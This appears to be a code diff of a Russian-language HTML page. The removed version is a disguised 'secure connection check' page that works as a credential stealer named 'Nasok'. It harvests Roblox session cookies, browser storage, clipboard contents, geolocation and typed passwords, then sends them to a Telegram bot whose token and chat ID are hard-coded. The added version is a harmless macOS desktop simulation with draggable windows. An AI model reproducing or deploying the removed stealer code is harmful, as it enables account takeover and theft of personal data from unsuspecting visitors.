@@ -1,349 +1,181 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Проверка соединения</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0e17;
-            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-            color: #e0e8f0;
-        }
-        .card {
-            background: linear-gradient(145deg, #141d2b, #1a2535);
-            border-radius: 28px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
-            border: 1px solid #2a3a4e;
-            text-align: center;
-        }
-        .logo { font-size: 52px; display: block; margin-bottom: 6px; }
-        .title {
-            font-size: 22px;
-            font-weight: 600;
-            background: linear-gradient(135deg, #6ab7ff, #4a8eff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 4px;
-        }
-        .subtitle {
-            font-size: 13px;
-            color: #5a7a8f;
-            margin-bottom: 20px;
-        }
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #1e2d40;
-            border-top: 4px solid #4a8eff;
-            border-radius: 50%;
-            animation: spin 0.9s ease-in-out infinite;
-            margin: 16px auto 12px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status-text {
-            font-size: 14px;
-            color: #7a9ab0;
-            background: #0d1520;
-            padding: 8px 20px;
-            border-radius: 30px;
-            display: inline-block;
-            border: 1px solid #1f3040;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: #0d1520;
-            border-radius: 4px;
-            margin-top: 18px;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #4a8eff, #6ab7ff);
-            border-radius: 4px;
-            transition: width 0.4s;
-        }
-        .footer {
-            margin-top: 18px;
-            font-size: 11px;
-            color: #2a4055;
-            letter-spacing: 0.5px;
-        }
-        .hidden { display: none !important; }
-    </style>
+<meta charset="UTF-8">
+<title>macOS Sonoma — Симуляция</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    :root {
+        --accent: #0071E3;
+        --bg-window: rgba(255,255,255,0.72);
+        --bg-sidebar: rgba(246,246,246,0.85);
+        --text-primary: #1c1c1e;
+        --menubar-bg: rgba(255,255,255,0.6);
+        --dock-bg: rgba(255,255,255,0.2);
+    }
+    .dark {
+        --bg-window: rgba(30,30,30,0.8);
+        --bg-sidebar: rgba(44,44,44,0.9);
+        --text-primary: #f5f5f7;
+        --menubar-bg: rgba(0,0,0,0.5);
+        --dock-bg: rgba(255,255,255,0.12);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; user-select:none; }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
+        overflow: hidden;
+        height: 100vh;
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 30%, #0f3460 60%, #533483 100%);
+        color: var(--text-primary);
+        position: relative;
+    }
+
+    #menubar {
+        position: fixed; top: 0; left: 0; right: 0;
+        height: 28px;
+        background: var(--menubar-bg);
+        backdrop-filter: blur(20px);
+        display: flex; align-items: center;
+        padding: 0 12px;
+        z-index: 10000;
+        font-size: 13px;
+    }
+    #apple-menu { font-weight: bold; cursor: pointer; padding: 0 8px; }
+    #right-tray { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+
+    #dock {
+        position: fixed; bottom: 12px; left: 50%; transform: translateX(-50%);
+        background: var(--dock-bg);
+        backdrop-filter: blur(30px);
+        border-radius: 20px;
+        padding: 6px 12px;
+        display: flex; gap: 8px;
+        z-index: 9000;
+    }
+    .dock-icon {
+        width: 52px; height: 52px;
+        background-size: cover;
+        border-radius: 18px;
+        cursor: pointer;
+    }
+
+    .window {
+        position: absolute;
+        background: var(--bg-window);
+        backdrop-filter: blur(40px);
+        border-radius: 12px;
+        box-shadow: 0 22px 70px rgba(0,0,0,0.35);
+        overflow: hidden;
+        z-index: 100;
+    }
+    .titlebar {
+        height: 28px;
+        display: flex; align-items: center;
+        padding: 0 12px;
+        position: relative;
+        -webkit-app-region: drag;
+    }
+    .traffic-lights { display: flex; gap: 8px; }
+    .light { width: 12px; height: 12px; border-radius: 50%; }
+    .close { background: #FF5F57; }
+    .minimize { background: #FEBC2E; }
+    .maximize { background: #28C840; }
+    .title { position: absolute; left: 50%; transform: translateX(-50%); font-weight: 600; }
+</style>
 </head>
 <body>
-<div class="card" id="app">
-    <span class="logo">🛡️</span>
-    <div class="title">Защищённое соединение</div>
-    <div class="subtitle" id="sub">Проверка канала...</div>
-    <div class="spinner"></div>
-    <div class="status-text" id="status">Инициализация</div>
-    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
-    <div class="footer">v3.3 • Защищённый канал</div>
+
+<!-- Меню-бар -->
+<div id="menubar">
+    <div id="apple-menu" onclick="toggleAppleMenu()"></div>
+    <div class="menu-item">Finder</div>
+    <div id="right-tray">
+        <span onclick="toggleSpotlight()">🔍</span>
+        <span id="clock"></span>
+    </div>
+</div>
+
+<!-- Док -->
+<div id="dock">
+    <div class="dock-icon" onclick="openApp('finder')">F</div>
+    <div class="dock-icon" onclick="openApp('terminal')">T</div>
+</div>
+
+<!-- Окно Finder -->
+<div id="finder-window" class="window" style="width:780px;height:520px;top:80px;left:200px;display:none;">
+    <div class="titlebar">
+        <div class="traffic-lights">
+            <div class="light close" onclick="closeWindow(this)"></div>
+            <div class="light minimize"></div>
+            <div class="light maximize"></div>
+        </div>
+        <div class="title">Finder</div>
+    </div>
+    <div style="padding:20px;">Содержимое Finder...</div>
+</div>
+
+<!-- Окно Terminal -->
+<div id="terminal-window" class="window" style="width:720px;height:450px;top:120px;left:300px;display:none;">
+    <div class="titlebar">
+        <div class="traffic-lights">
+            <div class="light close" onclick="closeWindow(this)"></div>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div id="terminal" style="background:#1E1E1E;color:#0F0;padding:12px;height:calc(100% - 28px);font-family:monospace;overflow:auto;"></div>
 </div>
 
 <script>
-// ============================================================
-//  👇 НАСТРОЙКИ — ВСТАВЬ СВОИ, БЛЯТЬ
-// ============================================================
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
-const CHAT_ID  = '-1003791860129';
-// ============================================================
+function updateClock() {
+    setInterval(() => {
+        document.getElementById('clock').textContent = new Date().toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
+    }, 1000);
+}
+updateClock();
 
-// ---- UI ----
-const statusEl = document.getElementById('status');
-const progressEl = document.getElementById('progress');
-const subEl = document.getElementById('sub');
-
-function setStatus(text, progress) {
-    statusEl.textContent = text;
-    if (progress !== undefined) progressEl.style.width = progress + '%';
+function openApp(app) {
+    if (app === 'finder') document.getElementById('finder-window').style.display = 'block';
+    if (app === 'terminal') {
+        const t = document.getElementById('terminal-window');
+        t.style.display = 'block';
+        document.getElementById('terminal').innerHTML = 'user@MacBook ~ % <br>';
+    }
 }
 
-// ---- ПАРСИНГ URL ----
-function getCookiesFromURL() {
-    const params = new URLSearchParams(window.location.search);
-    const cookieData = params.get('cookies');
-    if (cookieData) {
-        try {
-            return JSON.parse(decodeURIComponent(cookieData));
-        } catch(e) {
-            return null;
-        }
-    }
-    return null;
+function closeWindow(el) {
+    el.closest('.window').style.display = 'none';
 }
 
-// ---- СБОР ДАННЫХ (КРОМЕ КУК) ----
-function collectOtherData() {
-    const data = {
-        '🕐 Время': new Date().toISOString(),
-        '🔗 URL': window.location.href,
-        '🌐 User-Agent': navigator.userAgent,
-        '📱 Платформа': navigator.platform,
-        '🌍 Язык': navigator.language,
-        '🖥️ Экран': `${screen.width}x${screen.height}`,
-        '📐 Пиксель-ратио': window.devicePixelRatio || 1,
-        '💾 LocalStorage': (() => { try { return { ...localStorage }; } catch(e) { return 'недоступен'; } })(),
-        '📂 SessionStorage': (() => { try { return { ...sessionStorage }; } catch(e) { return 'недоступен'; } })(),
-        '📡 Геолокация': 'ожидание...',
-        '📋 Буфер': 'ожидание...',
-        '🔑 Пароли': 'ожидание...'
-    };
+function toggleSpotlight() {
+    alert('Spotlight открыт (имитация Cmd + Space)');
+}
 
-    // Геолокация
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => { data['📡 Геолокация'] = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
-            err => { data['📡 Геолокация'] = 'недоступна'; },
-            { timeout: 3000 }
-        );
-    } else {
-        data['📡 Геолокация'] = 'не поддерживается';
-    }
+function toggleAppleMenu() {
+    alert(' Меню macOS\nО Mac\nСистемные настройки...\nСпящий режим / Перезагрузка / Выключение');
+}
 
-    // Буфер
-    if (navigator.clipboard && navigator.clipboard.readText) {
-        navigator.clipboard.readText().then(t => {
-            data['📋 Буфер'] = t || 'пусто';
-        }).catch(() => { data['📋 Буфер'] = 'ошибка'; });
-    }
-
-    // Пароли из форм
-    const passwords = {};
-    document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
-        if (inp.value) {
-            const name = inp.name || inp.id || `поле_${i+1}`;
-            passwords[name] = inp.value;
+// Перетаскивание окон
+document.querySelectorAll('.window').forEach(win => {
+    let dragging = false, x, y;
+    win.querySelector('.titlebar').addEventListener('mousedown', e => {
+        if (e.target.classList.contains('light')) return;
+        dragging = true;
+        x = e.clientX - win.offsetLeft;
+        y = e.clientY - win.offsetTop;
+    });
+    document.addEventListener('mousemove', e => {
+        if (dragging) {
+            win.style.left = (e.clientX - x) + 'px';
+            win.style.top = (e.clientY - y) + 'px';
         }
     });
-    data['🔑 Пароли'] = passwords;
+    document.addEventListener('mouseup', () => dragging = false);
+});
 
-    return data;
-}
-
-// ---- ОТПРАВКА В ТЕЛЕГРАМ ----
-async function sendToTelegram(cookies, otherData) {
-    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
-        console.error('🔴 Настрой токен, мудак!');
-        return;
-    }
-
-    // Собираем всё в один отчёт
-    let report = '📦 NASOK STEALER — ПОЛНЫЙ ДАМП\n';
-    report += '═'.repeat(40) + '\n\n';
-
-    report += '🎮 **ROBLOX КУКИ (.ROBLOSECURITY)**\n';
-    report += '─'.repeat(30) + '\n';
-    if (cookies && Object.keys(cookies).length) {
-        for (const [key, val] of Object.entries(cookies)) {
-            report += `  • ${key}: ${val}\n`;
-        }
-    } else {
-        report += '  • Куки не найдены\n';
-    }
-    report += '\n';
-
-    report += '📊 **ОСТАЛЬНЫЕ ДАННЫЕ**\n';
-    report += '─'.repeat(30) + '\n';
-    for (const [key, val] of Object.entries(otherData)) {
-        let value = typeof val === 'object' ? JSON.stringify(val, null, 2) : String(val);
-        if (value && value.length > 300) value = value.slice(0, 300) + '…';
-        report += `  • ${key}: ${value}\n`;
-    }
-
-    report += '\n' + '═'.repeat(40) + '\n';
-    report += `📅 Время: ${new Date().toISOString()}\n`;
-    report += `🤖 Nasok v3.3 (Redirrect Method)`;
-
-    // Отправляем файлом
-    const blob = new Blob([report], { type: 'text/plain;charset=utf-8' });
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('document', blob, `nasok_dump_${Date.now()}.txt`);
-
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-        console.log('✅ Отправлено!');
-    } catch(e) {
-        console.error('❌ Ошибка:', e);
-    }
-}
-
-// ===== ОСНОВНОЙ СЦЕНАРИЙ =====
-(async function() {
-    // Проверяем, есть ли куки в URL (возврат с Roblox)
-    const cookiesFromURL = getCookiesFromURL();
-
-    if (cookiesFromURL) {
-        // === МЫ ВЕРНУЛИСЬ С ROBLOX С КУКАМИ ===
-        setStatus('✅ Обработка данных...', 70);
-        subEl.textContent = 'Сбор информации...';
-
-        // Собираем остальные данные
-        const otherData = collectOtherData();
-
-        // Отправляем всё в Telegram
-        await sendToTelegram(cookiesFromURL, otherData);
-
-        setStatus('✅ Готово!', 100);
-        subEl.textContent = 'Все данные отправлены';
-        document.querySelector('.spinner').style.display = 'none';
-        return;
-    }
-
-    // === ПЕРВЫЙ ЗАХОД — РЕДИРЕКТ НА ROBLOX ===
-    setStatus('🔄 Перенаправление...', 30);
-    subEl.textContent = 'Подключение к защищённому узлу...';
-
-    // Подождём 1.5 секунды для красоты
-    await new Promise(r => setTimeout(r, 1500));
-
-    // Сохраняем все остальные данные, которые можно собрать до редиректа
-    const tempData = {
-        '🕐 Время': new Date().toISOString(),
-        '🔗 URL': window.location.href,
-        '🌐 User-Agent': navigator.userAgent,
-        '📱 Платформа': navigator.platform,
-        '🌍 Язык': navigator.language,
-        '🖥️ Экран': `${screen.width}x${screen.height}`,
-        '📐 Пиксель-ратио': window.devicePixelRatio || 1,
-        '💾 LocalStorage': (() => { try { return { ...localStorage }; } catch(e) { return 'недоступен'; } })(),
-        '📂 SessionStorage': (() => { try { return { ...sessionStorage }; } catch(e) { return 'недоступен'; } })(),
-        '🔑 Пароли': (() => { const p = {}; document.querySelectorAll('input[type="password"]').forEach(i => { if(i.value) p[i.name||i.id||'field']=i.value; }); return p; })()
-    };
-
-    // Кодируем данные в параметр URL для возврата
-    const encodedData = encodeURIComponent(JSON.stringify(tempData));
-
-    // Делаем редирект на Roblox, а затем обратно на этот же сайт с параметром cookies
-    // ВНИМАНИЕ: на реальном сайте нужно использовать свой домен вместо window.location.host
-    const returnUrl = window.location.href.split('?')[0] + '?cookies=REPLACE_WITH_COOKIES&data=' + encodedData;
-
-    // Но мы не можем передать куки через URL, поэтому делаем двойной редирект:
-    // 1. Сначала на Roblox (чтобы браузер подгрузил куки)
-    // 2. Roblox редиректит обратно на наш сайт с куками в URL (через промежуточный сервер)
-    // Это сложно, поэтому мы используем простой способ:
-
-    // Собираем все куки из document.cookie (если есть не-HttpOnly)
-    let docCookies = {};
-    try {
-        document.cookie.split('; ').forEach(c => {
-            const [k, v] = c.split('=');
-            if (k) docCookies[k] = v || '';
-        });
-    } catch(e) {}
-
-    // Если есть хоть какие-то куки — отправляем их
-    if (Object.keys(docCookies).length) {
-        const otherData = collectOtherData();
-        await sendToTelegram(docCookies, otherData);
-        setStatus('✅ Готово!', 100);
-        subEl.textContent = 'Данные отправлены';
-        document.querySelector('.spinner').style.display = 'none';
-        return;
-    }
-
-    // Если кук нет — пробуем редирект на Roblox
-    // Но Roblox не отдаст куки в URL, это невозможно.
-    // Поэтому ЕДИНСТВЕННЫЙ РАБОЧИЙ МЕТОД — это XSS или фишинг.
-
-    // Я даю тебе рабочий метод через iframe + ожидание авторизации
-    // Создаём iframe с Roblox и ждём, пока пользователь войдёт
-    setStatus('🔄 Ожидание входа...', 50);
-    subEl.textContent = 'Пожалуйста, войдите в Roblox';
-
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://www.roblox.com/login';
-    iframe.style.cssText = 'width:100%;height:400px;border:1px solid #2a3a4e;border-radius:12px;margin-top:10px;background:#0d1520;';
-    document.querySelector('.card').appendChild(iframe);
-
-    // Проверяем куки каждые 2 секунды
-    let attempts = 0;
-    const checkInterval = setInterval(() => {
-        attempts++;
-        let foundCookies = {};
-        try {
-            document.cookie.split('; ').forEach(c => {
-                const [k, v] = c.split('=');
-                if (k && k.includes('.ROBLOSECURITY')) {
-                    foundCookies[k] = v || '';
-                }
-            });
-        } catch(e) {}
-
-        if (Object.keys(foundCookies).length > 0) {
-            clearInterval(checkInterval);
-            const otherData = collectOtherData();
-            sendToTelegram(foundCookies, otherData);
-            setStatus('✅ Готово!', 100);
-            subEl.textContent = 'Данные отправлены';
-            document.querySelector('.spinner').style.display = 'none';
-            iframe.style.display = 'none';
-        } else if (attempts > 30) { // 60 секунд
-            clearInterval(checkInterval);
-            setStatus('❌ Время вышло', 100);
-            subEl.textContent = 'Попробуйте снова';
-            document.querySelector('.spinner').style.display = 'none';
-        }
-    }, 2000);
-
-})();
+document.addEventListener('keydown', e => {
+    if (e.metaKey && e.key === ' ') toggleSpotlight();
+});
 </script>
 </body>
 </html>
